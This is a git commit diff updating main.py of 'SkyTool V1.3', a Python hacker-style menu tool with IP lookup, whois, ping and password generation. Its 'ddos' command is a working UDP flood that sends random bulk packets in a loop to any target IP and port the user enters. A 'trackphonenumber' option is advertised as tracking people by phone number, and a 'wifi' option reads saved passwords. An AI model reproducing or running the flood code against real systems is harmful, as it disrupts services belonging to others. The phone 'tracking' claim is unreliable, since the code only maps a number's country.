676bd03ffdea2456a7c59cf7108d49da9de62f1b
SkypeG <89580317+SkypeG@users.noreply.github.com>
2025-09-15 21:31:43 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,13 @@
-#Create By Sky Inc.
-#Program By Sky Inc Team
-#https://discord.gg/Sk8uYaqnhz
-#Create By SkypeG
+###############################################################################
+#                                                                             #
+#    				create by SkypeG                                          #
+#   								                                          #     
+#  				         SkyTool                                              #     
+#                         V1.3                                                #
+#                                                                             #
+#  https://github.com/SkypeG                                                  #
+#  https://www.youtube.com/@Skype112G/featured			                      #
+###############################################################################
 
 import requests
 import json
@@ -9,43 +15,34 @@ import os
 import sys
 import socket
 import random
-import random
 import colorama
-import socket, random, time
+import time
 import phonenumbers
 import pycountry
 import folium
-import os
 import pyfiglet
 import string
 import secrets
 import subprocess
 import whois
+import msvcrt
 
 from colorama import Fore, Back, Style
 from tqdm import tqdm
 from pathlib import Path
-from phonenumbers import geocoder
-from phonenumbers import carrier
-from phonenumbers.phonenumberutil import region_code_for_country_code
+from phonenumbers import geocoder, carrier
 from phonenumbers.phonenumberutil import region_code_for_number
 from opencage.geocoder import OpenCageGeocode
-
-"""
-    http://ip-api.com/json/IP_ADDRES
-    http://www.google.com/maps/@LAT,LON,9z?hl=id
-"""
 
 def clear_terminal():
     os.system('cls' if os.name == 'nt' else 'clear')
 
+# Banner awal
 ascii_banner = pyfiglet.figlet_format("Skytool >")
 print(ascii_banner)
 
-for _ in tqdm(range(100),
-    desc = "Loading...",
-    ascii = False,ncols=75):
-    time.sleep(0.05)
+for _ in tqdm(range(100), desc="Loading...", ascii=False, ncols=75):
+    time.sleep(0.02)
 
 clear_terminal()
 
@@ -54,145 +51,168 @@ print ("                                                                        
 print ("    				create by SkypeG                                           ")
 print ("    								                                           ")
 print ("   				   SkyTool                                                     ")
-print ("                                   V1.2                                        ")
+print ("                                   V1.3                                        ")
 print ("                                                                               ")
 print ("  https://github.com/SkypeG                                                    ")
 print ("  https://www.youtube.com/@Skype112G/featured			                       ")
 print ("###############################################################################")
-print ("Use 'Help' To See The Command!")
+print ("Use 'help' To See The Command!")
 
 host = socket.gethostname()
 
-selection = input(host + "@Skytool :")
+# Loop menu
+while True:
+    selection = input(f"{host}@Skytool :").lower().strip()
 
-if selection=="help":
-    print("""
-    CUSTOMASCII : Print Your Ascii Art Text
-    MYQUERYIP : For Checking Your Query IP
-    MYIP : For Checking Your Computer IP
-    IP : Fo Check Data From An Ip Address
-    IPCONFIG : Used To Display Information About The Network Configuration On The Computer
-    WHOAMI : This command is used to display information about the current user currently logged into the Windows operating system
-    PWGEN : For Generate Secure Password
-    DDoS : DDoS Tool
-    Wifi : Check You Wifi Pass
-    Trackphonenumber : For Track Everyone With Phone Number
-    WHOIS : To find information about a domain name such as registration information, contact information, and technical information about the given domain name
-    PING
-    TRACERT : Used to find out the path or route taken by data packets
+    if selection == "help":
+        print("""
+    credit             : About the creator/developer
+    customascii        : Print Your Ascii Art Text
+    myqueryip          : For Checking Your Query IP
+    myip               : For Checking Your Computer IP
+    ip                 : Check Data From An Ip Address
+    ipconfig           : Show network configuration
+    whoami             : Show current user (on progress)
+    pwgen              : Generate Secure Password
+    ddos               : DDoS Tool (on progress)
+    wifi               : Check Wifi Password
+    trackphonenumber   : Track phone number
+    whois              : Whois domain info (on progress)
+    ping               : Ping a website
+    tracert            : Trace route to website
+    cmd                : Run as a cmd
+    ipconfig/all       : Displays TCP/IP configuration information for all network interfaces on your computer
+              
+    Note: - Commands are case-insensitive.
+          - Type 'exit' to exit the program
+        """)
 
-    Note : Write commands in all lowercase
-   """)
+    elif selection == "credit":
+        print("Created by SkypeG")
+        print("Github   : https://github.com/SkypeG")
+        print("Youtube  : https://www.youtube.com/@Skype112G/featured")
+        print("Discord  : riz.112")
 
-if selection=="customascii":
-    ascii_banner_custom = pyfiglet.figlet_format(input("Ascii :"))
-    print(ascii_banner_custom)
+    elif selection == "customascii":
+        ascii_banner_custom = pyfiglet.figlet_format(input("Ascii :"))
+        print(ascii_banner_custom)
 
-if selection=="credits":
-    print("""
-    Create By Sky Inc.
-    Programmed By Sky Inc.
-    """)
+    elif selection == "credits":
+        print("""
+        Create By Sky Inc.
+        Programmed By Sky Inc.
+        """)
 
-if selection=="myip":
-    host = socket.gethostname()
-    print("Device Name :", host)
+    elif selection == "myip":
+        print("Device Name :", host)
+        ip = socket.gethostbyname(host)
+        print("Ip :", ip)
 
-    ip = socket.gethostbyname(host)
-    print("Ip :",ip)
+    elif selection == "pwgen":
+        alphabet = string.ascii_letters + string.digits
+        password = ''.join(secrets.choice(alphabet) for i in range(16))
+        print("The Password Is :" + password)
 
-if selection=="pwgen":
-    alphabet = string.ascii_letters + string.digits
-    password = ''.join(secrets.choice(alphabet) for i in range(16))
+    elif selection == "ddos":
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        ip = input("Enter Target IP: ")
+        port = int(input("Enter Target Port: "))
+        sleep = float(input("Sleep: "))
 
-    print("The Password Is :" + password)
+        s.connect((ip, port))
+        for i in range(1, 100**3):  # dibatasi supaya tidak crash
+            s.send(random._urandom(10)*1000)
+            print(f"Send: {i}", end='\r')
+            time.sleep(sleep)
 
-if selection=="DDoS":
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ip = input("Enter Target IP: ")
-    port = int(input("Enter Target Port: "))
-    sleep = float(input("Sleep: "))
- 
-    s.connect((ip, port))
- 
-    for i in range(1, 100**1000):
-        s.send(random._urandom(10)*1000)
-        print(f"Send: {i}", end='\r')
-        time.sleep(sleep)
+    elif selection == "ip":
+        import IPGEO
 
-if selection=="ip":
-    import IPGEO
+    elif selection == "trackphonenumber":
+        number = input("Enter Phone Number: ")
+        pn = phonenumbers.parse(number)
 
-if os.path.exists("mylocation.html"):
-  os.remove("mylocation.html")
+        country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
+        location = country.name if country else "Unknown"
+        print("Country:", location)
 
-if selection=="trackphonenumber":
-  number = input("Enter Phone Number: ")
-  pn = phonenumbers.parse(number)
+        print("Carrier:", carrier.name_for_number(pn, "en"))
 
-  country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
-  location = country.name
-  print(location)
+        key = input("Enter Your Opencage API KEY: ")
+        geocoder = OpenCageGeocode(key)
+        results = geocoder.geocode(location)
+        if results:
+            lat = results[0]['geometry']['lat']
+            lng = results[0]['geometry']['lng']
+            print("Latitude:", lat)
+            print("Longitude:", lng)
 
-  print(carrier.name_for_number(phonenumbers.parse(number), "en"))
+            myMap = folium.Map(location=[lat, lng], zoom_start=9)
+            folium.Marker([lat, lng], popup=location).add_to(myMap)
+            myMap.save("mylocation.html")
+            os.system("mylocation.html")
 
-  key = input("Enter Your API KEY: ")
-  geocoder = OpenCageGeocode(key)
-  query = str(location)
-  results = geocoder.geocode(query)
-  lat = results[0]['geometry']['lat']
-  lng = results[0]['geometry']['lng']
-  print("Country", lat)
-  print("Wifi Provider", lng)
+    elif selection == "wifi":
+        import wifi
 
-  myMap = folium.Map(location=[lat , lng], zoom_start=9)
-  folium.Marker([lat,lng],popup=location).add_to(myMap)
-  myMap.save("mylocation.html")
-  os.system("mylocation.html")
+    elif selection == "myqueryip":
+        import query
 
-if selection=="wifi":
-    import wifi
+    elif selection == "ipconfig":
+        ipconfig = subprocess.run('ipconfig', capture_output=True, text=True)
+        print(ipconfig.stdout)
 
-if selection=="myqueryip":
-    import query
+    elif selection == "whoami":
+        whoami = subprocess.run('whoami', capture_output=True, text=True)
+        whoamiusername = whoami.stdout.strip()
+        print(f"Username: {whoamiusername}")
 
-if selection=="ipconfig":
-    ipconfig = subprocess.run('ipconfig', capture_output=True, text=True)
-    print(ipconfig.stdout)
+    elif selection == "whois":
+        domain_name = input("Input The Link/Domain Web :")
+        whois_info = whois.whois(domain_name)
 
-if selection=="whoami":
-    whoami = subprocess.run('whoami', capture_output=True, text=True)
-    whoamiusername = whoami.stdout.strip()
+        print(f"Domain name: {whois_info.domain_name}")
+        print(f"Registrar: {whois_info.registrar}")
+        print(f"Registration date: {whois_info.creation_date}")
+        print(f"Expiration date: {whois_info.expiration_date}")
+        print(f"Last updated: {whois_info.updated_date}")
+        print(f"Name servers: {whois_info.name_servers}")
 
-    print(f"Username: {whoamiusername}")
+    elif selection == "ping":
+        ping_hostname = input("Input Web URL :")
+        ping_result = subprocess.run(['ping', '-n', '4', ping_hostname], capture_output=True, text=True)
+        print(ping_result.stdout)
 
-if selection=="whois":
-    domain_name = input("Input The Link/Domain Web :")
-    whois_info = whois.whois(domain_name)
+    elif selection == "tracert":
+        tracert_hostname = input("Input The Web URL :")
+        tracert_result = subprocess.run(['tracert', '-d', tracert_hostname], capture_output=True, text=True)
+        print(tracert_result.stdout)
 
-    print(f"Domain name: {whois_info.domain_name}")
-    print(f"Registrar: {whois_info.registrar}")
-    print(f"Registration date: {whois_info.creation_date}")
-    print(f"Expiration date: {whois_info.expiration_date}")
-    print(f"Last updated: {whois_info.updated_date}")
-    print(f"Name servers: {whois_info.name_servers}")
-    print(f"Registrant: {whois_info.registrant}")
+    elif selection in ["exit", "quit"]:
+        print("[System] Press any key to continue .....")
+        msvcrt.getch()
 
-if selection=="ping":
-    ping_hostname = input("Input Web URL :")
-    ping_result = subprocess.run(['ping', '-c', '4', ping_hostname], capture_output=True)
+        print("[System] Exiting SkyTool...")
+        time.sleep(1)
+        break
+    
+    elif selection == "cmd":
+        cmd = input("Command : ")
+        if cmd.lower() in ["exit", "quit"]:
+            break
+        try:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
 
-    ping_output = ping_result.stdout.decode('utf-8')
+            if result.stdout:
+                print(result.stdout)
+            if result.stderr:
+                print("Error:", result.stderr)
+        except Exception as e:
+            print("Failed to execute the command : ", e)
+    
+    elif selection == "ipconfig/all":
+        subprocess.run("ipconfig/all", shell=True)
 
-    print(ping_output)
 
-if selection=="tracert":
-    tracert_hostname = input("Input The Web URL :")
-    tracert_result = subprocess.run(['tracert', '-d', tracert_hostname], capture_output=True)
-
-    tracert_output = tracert_result.stdout.decode('utf-8')
-
-    print(tracert_output)
-
-else:
-    print("[System] Sorry Command Not Found!")
+    else:
+        print("[System] Sorry Command Not Found!")
